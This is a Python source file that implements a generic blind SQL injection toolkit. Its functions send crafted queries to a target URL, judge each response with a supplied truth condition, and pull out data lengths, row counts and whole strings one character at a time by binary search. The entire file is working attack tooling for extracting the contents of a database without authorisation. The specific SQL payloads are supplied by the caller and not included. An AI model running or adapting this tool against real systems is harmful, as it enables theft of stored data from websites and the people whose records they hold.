from operator import sub
from typing import Any
import requests
from collections.abc import Callable

def blind_query(
    req:Callable[[requests.models.Response],str], 
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    sub_query:str, 
    ordinal:str="",
    query_encoder:Callable[[str], str]=None,
    comment:str = "%23",
    debug:bool=False
    ):
    target = query_encoder(base_query(url, sub_query, comment)) if query_encoder else base_query(url, sub_query, comment)
    try:
        with req(target) as res: 
            if debug == True:
                print(F"target: {target}")
                print(F"response headers: {res.headers}")
                print(F"response: {res.content}")
            if (sqli_truth_condition(res)):
                return ordinal if ordinal else True
            return False
    except Exception as e:
        print(F"{e}")
        return False
def question(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    sub_query: str, 
    ordinal:str="",
    query_encoder:Callable[[str], str]=None,
    comment:str="",
    debug:bool=False):
    return blind_query(req=req, sqli_truth_condition=sqli_truth_condition, url=url, base_query=base_query, sub_query=sub_query, ordinal=ordinal, query_encoder=query_encoder,comment=comment, debug=debug)

'''
returns false on an inconclusive search
O(log(n))
'''
def binary_search(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    outer_query:Callable[[str,str],str],
    inner_query: str,
    lo:int,
    hi:int,
    query_encoder:Callable[[str], str]=None,
    comment:str = "",
    debug:bool=False):
    ans = False
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        sub_query = outer_query(inner_query, mid) 
        ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)
        if (ans):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo if ans else ans
'''
unfortunately python does not have a concept of operator overloading
This version of binary is the same as above except it's customized for get_string
O(log(n))
'''
def binary_search_str_exfil(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    outer_query:Callable[[str,str,str],str],
    inner_query: str,
    pos: int,
    lo:int,
    hi:int,
    query_encoder:Callable[[str], str]=None,
    comment:str = "",
    debug:bool=False):
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        sub_query = outer_query(inner_query, str(pos), mid) 
        ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)
        if (ans):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo 
'''
O(n) use binary_search
'''
def get_length(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    outer_query:Callable[[str,str],str],
    inner_query: str, # WE PASS QUERIES WITH THE APPROPRIATE DB TYPE HERE
    lower_bound: int = 1,
    upper_bound: int = 65,
    query_encoder:Callable[[str], str]=None,
    comment:str = "",
    debug:bool=False
    ):
    for i in range(lower_bound, upper_bound):
        sub_query = outer_query(inner_query, str(i)) # see QUERIES['STR_EXFIL']
        if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(i), query_encoder=query_encoder, comment=comment, debug=debug)):
            return i
'''
O(n) use binary_search
'''
def get_count(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    sub_query: str,
    lower_bound: int = 0,
    upper_bound: int = 1000,
    query_encoder:Callable[[str], str]=None,
    comment:str = "",
    debug:bool=False):
    for i in range(lower_bound, upper_bound):
        if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(i), query_encoder=query_encoder, comment=comment, debug=debug)):
            return i
'''
O(nlog(n)) 
'''
def get_string(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    outer_query:Callable[[str,str,str],str],
    inner_query: str,
    strlen:int,
    query_encoder:Callable[[str], str]=None, 
    comment:str = "", 
    debug:bool=False
    ):
    s = ''
    for i in range(1, strlen + 1):
        s += chr(binary_search_str_exfil(req=req,
        sqli_truth_condition=sqli_truth_condition,
        url=url,
        base_query=base_query,
        outer_query=outer_query,
        inner_query=inner_query,
        pos=i,
        lo=32,
        hi=126,
        query_encoder=query_encoder,
        comment=comment,
        debug=debug
        ))
    return s